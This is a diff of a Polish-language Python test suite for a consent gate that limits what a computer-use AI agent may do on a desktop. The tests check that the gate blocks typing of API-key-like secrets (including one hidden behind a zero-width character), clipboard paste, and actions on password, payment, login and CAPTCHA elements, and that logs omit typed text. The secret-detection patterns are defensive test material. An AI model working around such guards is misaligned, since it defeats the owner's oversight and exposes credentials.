+    odmowa = _ocen("type_text", pid=1, text=tekst)
+    assert odmowa is not None and odmowa.regula == "znak_sterujacy"
+    if "\n" in tekst or "\r" in tekst:
+        assert "press_key" in odmowa.powod and "Enter" in odmowa.powod
+
+
+def test_set_value_wieloliniowy_i_napisy():
+    assert _ocen("set_value", pid=1, element_index=1, value="pierwsza\ndruga\tz tabem") is None
+    assert _ocen("set_value", pid=1, value="\x07dzwonek").regula == "znak_sterujacy"
+    assert _ocen("type_text", pid=1, text=["lista"]).regula == "tekst"
+    assert _ocen("type_text", pid=1, text=KLUCZ + "\u200b" + "Z" * 30).regula == "sekret"   # znak niewidoczny
+
+
+def test_srodkowy_przycisk_na_linuksie_to_schowek():
+    assert _ocen("click", "linux-x64", pid=1, x=5, y=5, button="middle").regula == "schowek"
+    assert _ocen("click", "windows-x64", pid=1, x=5, y=5, button="middle") is None
+
+
+def test_twarde_zasady_na_elementach_okna(instalacja):
+    """Jak w Komputerze Jarva: pola haseł, kart i kodów, przyciski płatności, logowania i wysyłki oraz CAPTCHA
+    zostawiamy właścicielowi; element spoza ostatniej migawki to nieznany_cel."""
+    r = Rozmowa(instalacja)
+    r.migawka(el(0, "AXButton", "Zapisz"), el(1, "AXSecureTextField", "Hasło"), el(2, "AXTextField", "Kod BLIK"),
+              el(3, "AXButton", "Zapłać teraz"), el(4, "AXCheckBox", "Nie jestem robotem"),
+              el(5, "AXTextField", "Tytuł notatki"), el(6, "Edit", "Login", is_password=True),
+              el(7, "AXLink", "Wyślij wiadomość"), el(8, "AXStaticText", "Kup teraz"))
+    cel = {"pid": 4242, "window_id": 7}
+
+    def kod(nazwa, **args):
+        odp = r.narzedzie(nazwa, **{**cel, **args})
+        return None if odp is None else (odp["result"]["structuredContent"]["code"],
+                                          odp["result"]["structuredContent"]["rule"])
+
+    assert kod("click", element_index=0) is None
+    assert kod("click", element_index=3) == ("wymaga_czlowieka", "przycisk_wrazliwy")
+    assert kod("click", element_token="s9:7") == ("wymaga_czlowieka", "przycisk_wrazliwy")
+    assert kod("click", element_index=4) == ("wymaga_czlowieka", "captcha")
+    assert kod("click", element_index=8) is None                       # napis, nie przycisk
+    assert kod("click", element_index=3, button="right") is None       # menu podręczne
+    assert kod("click", element_index=42) == ("nieznany_cel", "nieznany_cel")
+    assert kod("click", element_token="s0:0") == ("nieznany_cel", "nieznany_cel")
+    assert kod("click", x=10, y=20) is None                            # punkt: zatwierdza właściciel
+    assert kod("type_text", element_index=1, text="abc") == ("wymaga_czlowieka", "pole_wrazliwe")
+    assert kod("set_value", element_index=2, value="123456") == ("wymaga_czlowieka", "pole_wrazliwe")
+    assert kod("set_value", element_index=6, value="x") == ("wymaga_czlowieka", "pole_wrazliwe")
+    assert kod("type_text", element_index=5, text="Lista zakupów") is None
+    assert kod("drag", from_element=0, to_element=3) == ("wymaga_czlowieka", "przycisk_wrazliwy")
+    # fokus: po kliknięciu pola hasła pisanie, znak po znaku i Enter robi właściciel
+    assert kod("click", element_index=1) is None
+    assert kod("type_text", text="Haslo123") == ("wymaga_czlowieka", "pole_wrazliwe")
+    assert kod("press_key", key="a") == ("wymaga_czlowieka", "pole_wrazliwe")
+    assert kod("press_key", key="Return") == ("wymaga_czlowieka", "pole_wrazliwe")
+    assert kod("hotkey", keys=["ctrl", "s"]) is None
+    # Tab przenosi fokus w nieznane miejsce: w oknie z polem hasła trzeba najpierw kliknąć pole
+    assert kod("press_key", key="Tab") is None
+    assert kod("type_text", text="cokolwiek") == ("nieznany_cel", "brak_fokusu")
+    assert kod("click", element_index=5) is None
+    assert kod("type_text", text="cokolwiek") is None
+    # Enter na przycisku z fokusem z migawki sterownika
+    r.migawka(el(0, "AXButton", "Wyślij", focused=True), el(1, "AXTextField", "Temat"))
+    assert kod("press_key", key="enter") == ("wymaga_czlowieka", "przycisk_wrazliwy")
+    assert kod("press_key", key="space") == ("wymaga_czlowieka", "przycisk_wrazliwy")
+    r.migawka(el(0, "AXTextField", "Temat", focused=True))
+    assert kod("press_key", key="enter") is None and kod("type_text", text="Dzień dobry") is None
+    # błąd get_window_state: okna nie znamy
+    assert r.narzedzie("get_window_state", **cel) is None
+    r.pompa.od_sterownika(json.dumps({"jsonrpc": "2.0", "id": r.n, "error": {"code": -1, "message": "x"}}).encode())
+    assert kod("click", element_index=0) == ("nieznany_cel", "nieznany_cel")
+
+
+def test_wymaga_czlowieka_mowi_agentowi_co_dalej(instalacja):
+    r = Rozmowa(instalacja)
+    r.migawka(el(0, "AXButton", "Zaloguj się"))
+    odp = r.narzedzie("click", pid=4242, window_id=7, element_index=0)["result"]
+    assert odp["isError"] and odp["structuredContent"]["decision"] == "czlowiek"
+    assert odp["structuredContent"]["next_step"] == "ask_owner" and "to robi właściciel" in odp["content"][0]["text"]
+    assert r.do_sterownika[-1]["params"]["name"] == "get_window_state"   # klik nie poszedł do sterownika
+
+
 def test_mcp_protokol(instalacja):
     r = Rozmowa(instalacja)
     r.pompa.od_hermesa(b"to nie json\n")
@@ -664,16 +1127,22 @@ def test_mcp_wygasniecie_i_off_w_trakcie(instalacja):
 def test_dziennik_bez_tresci(instalacja):
     r = Rozmowa(instalacja)
     r.narzedzie("type_text", pid=1, text="moje tajne zdanie do wpisania")
+    r.narzedzie("hotkey", keys=["ctrl", "s"])
     r.narzedzie("hotkey", keys=["ctrl", "v"])
     r.narzedzie("launch_app", name="calc")
-    r.narzedzie("type_text", pid=1, text="sk-ant-api03-" + "q" * 30)
+    r.narzedzie("type_text", pid=1, text=KLUCZ + "q" * 30)
+    r.migawka(el(0, "AXSecureTextField", "Hasło do banku"))
+    r.narzedzie("type_text", pid=4242, window_id=7, element_index=0, text="Haslo123!")
     surowy = instalacja["pliki"].dziennik.read_text(encoding="utf-8")
     assert "tajne" not in surowy and "sk-ant" not in surowy and "calc" not in surowy
+    assert "Haslo123" not in surowy and "banku" not in surowy                  # bez napisów z ekranu i tekstu
     wpisy = [w for w in wpisy_dziennika(instalacja) if w["zdarzenie"] == "narzedzie"]
-    assert [(w["narzedzie"], w["decyzja"]) for w in wpisy] == [("type_text", "tak"), ("hotkey", "tak"),
-                                                               ("launch_app", "odmowa"), ("type_text", "odmowa")]
-    assert wpisy[0]["znaki"] == len("moje tajne zdanie do wpisania") and wpisy[1]["klawisze"] == ["ctrl", "v"]
-    assert wpisy[2]["aplikacja"] == "?"
+    assert [(w["narzedzie"], w["decyzja"], w.get("regula")) for w in wpisy] == [
+        ("type_text", "tak", None), ("hotkey", "tak", None), ("hotkey", "odmowa", "schowek"),
+        ("launch_app", "odmowa", "aplikacja"), ("type_text", "odmowa", "sekret"),
+        ("type_text", "odmowa", "pole_wrazliwe")]
+    assert wpisy[0]["znaki"] == len("moje tajne zdanie do wpisania") and wpisy[1]["klawisze"] == ["ctrl", "s"]
+    assert wpisy[3]["aplikacja"] == "?" and wpisy[5]["kod"] == "wymaga_czlowieka"
 
 
 def test_mcp_przez_demona_bramki(instalacja):
@@ -702,15 +1171,20 @@ def test_mcp_przez_demona_bramki(instalacja):
     assert "notatnik" in zapytaj(1, "initialize", protocolVersion="2025-06-18")["result"]["instructions"]
     assert [t["name"] for t in zapytaj(2, "tools/list")["result"]["tools"]] == [
         "click", "type_text", "launch_app", "set_config", "get_window_state"]
-    odp = zapytaj(3, "tools/call", name="click", arguments={"pid": 1, "element_index": 0})
+    odp = zapytaj(3, "tools/call", name="get_window_state", arguments={"pid": 1, "window_id": 2})
+    assert "tajne-haslo" not in json.dumps(odp)                        # wartość pola hasła ukryta
+    odp = zapytaj(4, "tools/call", name="click", arguments={"pid": 1, "window_id": 2, "element_index": 0})
     assert odp["result"]["isError"] is False and "sk-ant" not in json.dumps(odp) and "ghp_" not in json.dumps(odp)
-    odp = zapytaj(4, "tools/call", name="get_desktop_state", arguments={})
+    odp = zapytaj(5, "tools/call", name="get_desktop_state", arguments={})
     assert odp["result"]["structuredContent"]["code"] == "poza_zgoda"
+    odp = zapytaj(6, "tools/call", name="type_text", arguments={"pid": 1, "window_id": 2, "element_token": "s1:1",
+                                                                 "text": "abc"})
+    assert odp["result"]["structuredContent"]["code"] == "wymaga_czlowieka"   # pole hasła z migawki sterownika
     do_bramki.close()                                                    # Hermes kończy sesję
     mcp.join(10)
     assert not mcp.is_alive() and wynik["kod"] == 0
     wyslane = [json.loads(w) for w in (instalacja["atrapa"].parent / "mcp.jsonl").read_text(encoding="utf-8").splitlines()]
-    assert [w.get("method") for w in wyslane] == ["initialize", "tools/list", "tools/call"]
+    assert [w.get("method") for w in wyslane] == ["initialize", "tools/list", "tools/call", "tools/call"]
     assert bramka.stop(["--socket", g], k) == 0
     watek.join(10)
     assert not watek.is_alive()
@@ -832,42 +1306,50 @@ def jarvo_root(tmp_path, monkeypatch):
     env["DISPLAY"] = ":0"
     u = sciezki.uklad(env)
     pliki = zgoda.Pliki(u.stan)
-    profil = u.dane / "profiles" / "jarvo-operator"
-    profil.mkdir(parents=True)
-    (profil / "config.yaml").write_text(PROFIL_OK.format(manifest=str(pliki.manifest).replace("\\", "\\\\")),
-                                        encoding="utf-8")
+    operator = u.dane / "profiles" / "jarvo-operator"
+    operator.mkdir(parents=True)
+    (operator / "config.yaml").write_text(OPERATOR, encoding="utf-8")
     u.stan.mkdir(parents=True, exist_ok=True)
     st = sterownik.Sterownik(program=Path(sys.executable), przedrostek=(sys.executable,), sha256="x",
                              podpis="Cua AI, Inc.")
     wypis = io.StringIO()
+    restarty: list[str] = []
 
-    def jarvo(*argv, odpowiedz="TAK", tty=True, env_=None, **kw):
+    def jarvo(*argv, odpowiedz="TAK", tty=True, env_=None, brama="nie_dziala", **kw):
         wypis.truncate(0)
         wypis.seek(0)
         kw.setdefault("sprawdz_sterownik", lambda: st)
         kw.setdefault("rozpoznaj", lambda nazwy: [notatnik()])
+        kw.setdefault("restart_bramy", lambda _u: restarty.append(brama) or brama)
         kod = cli_rece.main(list(argv), env=env_ or env, wejscie=lambda _p: odpowiedz, tty=tty,
                             podwyzszone=lambda: False, wyjscie=wypis, platforma=PLATFORMA, **kw)
         return kod, wypis.getvalue()
 
-    return {"jarvo": jarvo, "u": u, "pliki": pliki, "env": env, "profil": profil}
+    return {"jarvo": jarvo, "u": u, "pliki": pliki, "env": env, "operator": operator, "restarty": restarty,
+            "profil": u.dane / "profiles" / rece.PROFIL}
 
 
 def test_cli_on_status_off(jarvo_root, monkeypatch):
     monkeypatch.setattr(zgoda, "tozsamosc_uzytkownika", lambda: UZYTKOWNIK)
     jarvo, pliki = jarvo_root["jarvo"], jarvo_root["pliki"]
+    assert "jarvo komputer rece on założy go sam" in jarvo("status")[1]
     kod, tekst = jarvo("on", "--aplikacje", "notatnik", "--na", "20m")
     assert kod == 0, tekst
     assert "Ręce włączone do" in tekst and "jarvo komputer rece off" in tekst
+    assert f"jarvo chat --profil {rece.PROFIL}" in tekst and "nowy; model z" in tekst
     z = zgoda.wczytaj(pliki, platforma=PLATFORMA)
     assert z.nazwy() == ["notatnik"] and 1190 <= z.pozostalo() <= 1200 and z.bezczynnosc == 600
+    assert z.profil == rece.PROFIL and (jarvo_root["profil"] / "config.yaml").is_file()
     kod, tekst = jarvo("status", "--json")
     s = json.loads(tekst)
     assert kod == 0 and s["zgoda"]["wlaczone"] and s["sterownik"]["gotowy"] and s["profil"]["brakuje"] == []
+    assert s["profil"]["problemy"] == [] and s["profil"]["rak_jarva"] is True
     assert "Ręce: włączone" in jarvo("status")[1]
     kod, tekst = jarvo("off")
     assert kod == 0 and "Ręce wyłączone" in tekst and not pliki.zgoda.exists()
-    assert "Ręce: wyłączone" in jarvo("status")[1]
+    assert (jarvo_root["profil"] / "config.yaml").is_file()               # profil zostaje, bez zgody nic nie zrobi
+    status = jarvo("status")[1]
+    assert "Ręce: wyłączone" in status and "bez zgody nic nie zrobi" in status
     assert [w["zdarzenie"] for w in dziennik.ostatnie(pliki.dziennik)] == ["on", "off"]
     assert jarvo("off")[1].startswith("Ręce były wyłączone")
 
@@ -888,12 +1370,12 @@ def test_cli_on_tylko_wlasciciel(jarvo_root):
 
 
 def test_cli_on_odmawia_profilu_ze_stalymi_zgodami(jarvo_root):
-    plik = jarvo_root["profil"] / "config.yaml"
-    plik.write_text(plik.read_text(encoding="utf-8").replace("command_allowlist: []",
-                                                            "command_allowlist:\n  - cua:click:background"),
-                    encoding="utf-8")
-    kod, tekst = jarvo_root["jarvo"]("on", "--aplikacje", "notatnik")
-    assert kod == 2 and "cua:click:background" in tekst and not jarvo_root["pliki"].zgoda.exists()
+    """Inny --profil musi już być profilem rąk: jarvo-operator ma smart i stałe zgody (słuszne w Komputerze)."""
+    kod, tekst = jarvo_root["jarvo"]("on", "--aplikacje", "notatnik", "--profil", "jarvo-operator")
+    assert kod == 2 and "cua:click:background" in tekst and "smart" in tekst
+    assert not jarvo_root["pliki"].zgoda.exists() and not jarvo_root["profil"].exists()
+    kod, tekst = jarvo_root["jarvo"]("on", "--aplikacje", "notatnik", "--profil", "nie-ma-takiego")
+    assert kod == 2 and "Nie ma profilu nie-ma-takiego" in tekst
 
 
 def test_cli_on_argumenty(jarvo_root):
@@ -943,4 +1425,185 @@ def test_cli_on_pobiera_sterownik_z_manifestu(jarvo_root, monkeypatch, tmp_path)
 
 def test_changelog_operatora_opisuje_rece():
     tekst = (REPO / "profiles" / "jarvo-operator" / "CHANGELOG.md").read_text(encoding="utf-8")
-    assert "jarvo komputer rece on" in tekst
+    assert "jarvo komputer rece on" in tekst and rece.PROFIL in tekst
+
+
+# ---------------------------------------------------------------- profil rąk jarvo-ekran
+
+def test_profil_rak_jak_czyta_go_hermes(tmp_path):
+    """Config profilu rąk: bounded z manifestem zgody, manual, bez trybów bez człowieka i stałych zgód, tylko
+    narzędzia rąk, wtyczka zgód; PyYAML (jak Hermes) i bramka czytają go tak samo."""
+    yaml = pytest.importorskip("yaml")
+    manifest = tmp_path / "Jan Kowalski" / "stan" / "rece" / "manifest.yaml"
+    tekst = profil.tekst_configu(manifest, {"provider": "openrouter", "default": "anthropic/claude"}, "Europe/Warsaw",
+                                 ["jarvo-zgody"])
+    cfg = yaml.safe_load(tekst)
+    assert cfg["computer_use"]["permission_mode"] == "bounded"
+    assert Path(cfg["computer_use"]["capability_manifest"]) == manifest
+    assert cfg["computer_use"]["max_image_dimension"] == rece.KONFIGURACJA["max_image_dimension"]
+    assert cfg["approvals"] == {"mode": "manual", "timeout": 300, "cron_mode": "deny", "single_query_mode": "deny",
+                                "unattended_mode": "deny"}
+    assert cfg["command_allowlist"] == [] and cfg["plugins"]["enabled"] == ["jarvo-zgody"]
+    assert cfg["platform_toolsets"]["cli"] == ["computer_use", "clarify", "todo"] and cfg["platform_toolsets"]["cron"] == []
+    assert {"terminal", "file", "code_execution", "delegation", "cronjob", "kanban", "browser"} <= \
+        set(cfg["agent"]["disabled_toolsets"])
+    assert not set(cfg["agent"]["disabled_toolsets"]) & set(profil.NARZEDZIA_PROFILU)
+    assert cfg["model"] == {"provider": "openrouter", "default": "anthropic/claude"} and cfg["updates"]["check"] is False
+    assert cfg["security"]["tirith_enabled"] is False and cfg["auth"]["adopt_external_logins"] is False
+    assert bramka.problemy_profilu(tekst) == []
+    assert cli_rece.ustawienia_profilu(tekst, manifest) == []
+
+
+def test_model_profilu_rak_z_operatora_albo_hosta(tmp_path):
+    dane = tmp_path / "dane"
+    with pytest.raises(profil.BladProfilu, match="jakim modelem"):
+        profil.model_floty(dane)
+    dane.mkdir()
+    (dane / "config.yaml").write_text("model: openrouter/auto\n", encoding="utf-8")
+    assert profil.model_floty(dane)[0] == {"default": "openrouter/auto"}
+    (dane / "profiles" / "jarvo-operator").mkdir(parents=True)
+    (dane / "profiles" / "jarvo-operator" / "config.yaml").write_text(OPERATOR, encoding="utf-8")
+    model, strefa, skad = profil.model_floty(dane)
+    assert model == {"provider": "openrouter", "default": "anthropic/claude-sonnet-4.6"} and strefa == "Europe/Warsaw"
+    assert skad.endswith("config.yaml") and "jarvo-operator" in skad
+    (dane / "profiles" / "jarvo-operator" / "config.yaml").write_text("model:\n  default: \"@@MODEL@@\"\n",
+                                                                      encoding="utf-8")
+    assert profil.model_floty(dane)[0] == {"default": "openrouter/auto"}      # token bez buildu: config hosta
+
+
+def test_nowy_profil_rak_powstaje_w_calosci(tmp_path, monkeypatch):
+    """Brama, która zobaczy nowy katalog w profiles/, od razu widzi cały profil (ryzyko Z39): profil powstaje
+    w ukrytym katalogu obok i dostaje swoją nazwę jedną zmianą nazwy, z wtyczką zgód i kluczami."""
+    dane, manifest = tmp_path / "dane", tmp_path / "stan" / "rece" / "manifest.yaml"
+    (dane / "profiles" / "jarvo-operator").mkdir(parents=True)
+    (dane / "profiles" / "jarvo-operator" / "config.yaml").write_text(OPERATOR, encoding="utf-8")
+    wtyczka = dane / "plugins" / profil.WTYCZKA_ZGOD
+    wtyczka.mkdir(parents=True)
+    (wtyczka / "plugin.yaml").write_text("name: jarvo-zgody\n", encoding="utf-8")
+    (dane / ".env").write_text("OPENROUTER_API_KEY=wartosc-testowa\nTELEGRAM_BOT_TOKEN=nie-dla-rak\n", encoding="utf-8")
+    widziane: list[tuple] = []
+    prawdziwa = os.rename
+
+    def zmiana_nazwy(z, do):
+        z, do = Path(z), Path(do)
+        widziane.append((z.name, do.name, sorted(p.name for p in z.iterdir()), (z / "config.yaml").is_file()))
+        assert not do.exists()                                          # do tej chwili profilu nie ma pod nazwą
+        prawdziwa(z, do)
+
+    monkeypatch.setattr(profil.os, "rename", zmiana_nazwy)
+    plan = profil.zaplanuj(dane, manifest)
+    assert plan.nowy and plan.zmiany == ["nowy profil"] and plan.wtyczka == wtyczka
+    profil.zapisz(plan, dane)
+    assert len(widziane) == 1
+    z, do, pliki, config = widziane[0]
+    assert z.startswith(f".{rece.PROFIL}.nowy-") and do == rece.PROFIL and config
+    assert {"config.yaml", "SOUL.md", "profile.yaml", "home", "plugins", ".env"} <= set(pliki)
+    katalog = dane / "profiles" / rece.PROFIL
+    assert (katalog / "plugins" / profil.WTYCZKA_ZGOD / "plugin.yaml").is_file()
+    env = (katalog / ".env").read_text(encoding="utf-8")
+    assert "OPENROUTER_API_KEY=wartosc-testowa" in env and "TELEGRAM_BOT_TOKEN" not in env
+    assert not [p for p in (dane / "profiles").iterdir() if p.name.startswith(".")]
+    assert bramka.problemy_profilu((katalog / "config.yaml").read_text(encoding="utf-8")) == []
+    # drugi raz bez zmian: nic do zapisania i restartu bramy
+    assert profil.zaplanuj(dane, manifest).zmiany == []
+    (katalog / "config.yaml").write_text("approvals:\n  mode: off\n", encoding="utf-8")       # ktoś zmienił config
+    plan = profil.zaplanuj(dane, manifest)
+    assert plan.zmiany == ["config"] and not plan.nowy
+    (katalog / "sessions").mkdir()
+    profil.zapisz(plan, dane)
+    assert (katalog / "sessions").is_dir() and bramka.problemy_profilu(plan.config) == []
+    assert len(widziane) == 1                                           # istniejący profil: bez zmiany nazwy
+
+
+def test_nieudany_nowy_profil_nie_zostawia_resztek(tmp_path, monkeypatch):
+    dane = tmp_path / "dane"
+    (dane / "profiles" / "jarvo-operator").mkdir(parents=True)
+    (dane / "profiles" / "jarvo-operator" / "config.yaml").write_text(OPERATOR, encoding="utf-8")
+    plan = profil.zaplanuj(dane, tmp_path / "manifest.yaml")
+
+    def zle(*_a, **_k):
+        raise OSError("dysk pełny")
+
+    monkeypatch.setattr(profil, "klucze", zle)
+    with pytest.raises(OSError):
+        profil.zapisz(plan, dane)
+    assert sorted(p.name for p in (dane / "profiles").iterdir()) == ["jarvo-operator"]
+
+
+def test_cli_on_restartuje_brame_tylko_po_zmianie_profilu(jarvo_root, monkeypatch):
+    monkeypatch.setattr(zgoda, "tozsamosc_uzytkownika", lambda: UZYTKOWNIK)
+    jarvo, restarty = jarvo_root["jarvo"], jarvo_root["restarty"]
+    kod, tekst = jarvo("on", "--aplikacje", "notatnik", brama="zrestartowana")
+    assert kod == 0 and restarty == ["zrestartowana"] and "Brama Jarva zrestartowana przez nadzorcę" in tekst
+    assert "działająca brama Jarva zrestartuje się" in tekst
+    kod, tekst = jarvo("on", "--aplikacje", "notatnik", brama="zrestartowana")
+    assert kod == 0 and restarty == ["zrestartowana"] and "bez zmian" in tekst     # ten sam profil: bez restartu
+    (jarvo_root["profil"] / "SOUL.md").write_text("stary", encoding="utf-8")
+    kod, tekst = jarvo("on", "--aplikacje", "notatnik", brama="bez_nadzorcy")
+    assert kod == 0 and restarty[-1] == "bez_nadzorcy" and "jarvo serwis --restart brama" in tekst
+    (jarvo_root["profil"] / "SOUL.md").write_text("stary", encoding="utf-8")
+    kod, tekst = jarvo("on", "--aplikacje", "notatnik", brama="blad: kanał zamknięty")
+    assert kod == 0 and "nie udało się zrestartować" in tekst and "kanał zamknięty" in tekst
+    wpisy = [w for w in dziennik.ostatnie(jarvo_root["pliki"].dziennik, 20) if w["zdarzenie"] == "on"]
+    assert [w.get("brama") for w in wpisy] == ["zrestartowana", None, "bez_nadzorcy", "blad"]
+
+
+def test_cli_on_bez_modelu_floty_nie_wlacza(jarvo_root):
+    (jarvo_root["operator"] / "config.yaml").unlink()
+    kod, tekst = jarvo_root["jarvo"]("on", "--aplikacje", "notatnik")
+    assert kod == 2 and "jakim modelem" in tekst and not jarvo_root["pliki"].zgoda.exists()
+    assert not jarvo_root["profil"].exists()
+
+
+def test_cli_on_odmowa_tak_nie_zaklada_profilu(jarvo_root):
+    kod, tekst = jarvo_root["jarvo"]("on", "--aplikacje", "notatnik", odpowiedz="nie")
+    assert kod == 1 and not jarvo_root["profil"].exists() and jarvo_root["restarty"] == []
+
+
+def test_zrestartuj_brame_przez_nadzorce(monkeypatch, tmp_path):
+    from jarvo import instalator, nadzorca
+    u = sciezki.uklad({"JARVO_ROOT": str(tmp_path / "root")})
+    zlecone: list[str] = []
+
+    class Klient:
+        def restart(self, nazwa):
+            zlecone.append(nazwa)
+
+    monkeypatch.setattr(nadzorca, "polacz", lambda _u: Klient())
+    monkeypatch.setattr(instalator, "stan_serwisu", lambda _u: ({"uslugi": {"brama": {"stan": "dziala", "pid": 7}}},
+                                                                 ""))
+    assert cli_rece.zrestartuj_brame(u) == "zrestartowana" and zlecone == ["brama"]
+    monkeypatch.setattr(instalator, "stan_serwisu", lambda _u: ({"uslugi": {"brama": {"stan": "zatrzymana"}}}, ""))
+    assert cli_rece.zrestartuj_brame(u) == "nie_dziala" and zlecone == ["brama"]
+    monkeypatch.setattr(instalator, "stan_serwisu", lambda _u: (None, "nie działa"))
+    monkeypatch.setattr(nadzorca, "brama_gotowa", lambda _d: True)
+    assert cli_rece.zrestartuj_brame(u) == "bez_nadzorcy"
+    monkeypatch.setattr(nadzorca, "brama_gotowa", lambda _d: False)
+    assert cli_rece.zrestartuj_brame(u) == "nie_dziala"
+
+
+# ---------------------------------------------------------------- bramka jarvo_cua.py: czasowniki rąk natywnie
+
+def _bramka_cua(*args: str, root: Path) -> subprocess.CompletedProcess:
+    env = {k: v for k, v in os.environ.items() if not k.startswith(("HERMES_", "JARVO_", "CUA_"))}
+    env["JARVO_ROOT"] = str(root)
+    return subprocess.run([sys.executable, "-I", "-X", "utf8", str(REPO / "komputer" / "jarvo_cua.py"), *args],
+                          capture_output=True, text=True, encoding="utf-8", env=env, timeout=60)
+
+
+def test_jarvo_cua_przekazuje_rece_do_bramki(tmp_path):
+    """Natywnie serve, stop, call oraz mcp i status z --socket idą do bramki rąk; bez zgody nic nie startuje."""
+    root = tmp_path / "root"
+    rura = r"\\.\pipe\hermes-cua-test" if WINDOWS else os.path.join(tempfile.gettempdir(), "hc-test.sock")
+    r = _bramka_cua("serve", "--embedded", "--socket", rura, "--permission-mode", "bounded", "--capability-manifest",
+                    str(root / "stan" / "rece" / "manifest.yaml"), "--approve-capability-manifest", root=root)
+    assert r.returncode == bramka.KOD_BRAK and "wyłączone" in r.stderr, r.stderr
+    r = _bramka_cua("serve", "--embedded", "--socket", rura, "--permission-mode", "unrestricted", root=root)
+    assert r.returncode == bramka.KOD_ODMOWY
+    assert _bramka_cua("call", "click", "{}", "--socket", rura, root=root).returncode == bramka.KOD_ODMOWY
+    assert _bramka_cua("status", "--socket", rura, root=root).returncode == 1
+    assert _bramka_cua("stop", "--socket", rura, root=root).returncode == 0
+    r = _bramka_cua("mcp", "--embedded", "--socket", rura, root=root)
+    assert r.returncode == bramka.KOD_BRAK and "wyłączone" in r.stderr
+    r = _bramka_cua("check-update", root=root)                          # reszta czasowników dalej wyłączona
+    assert r.returncode == bramka.KOD_ODMOWY and "wyłączone w bramce Jarvo" in r.stderr
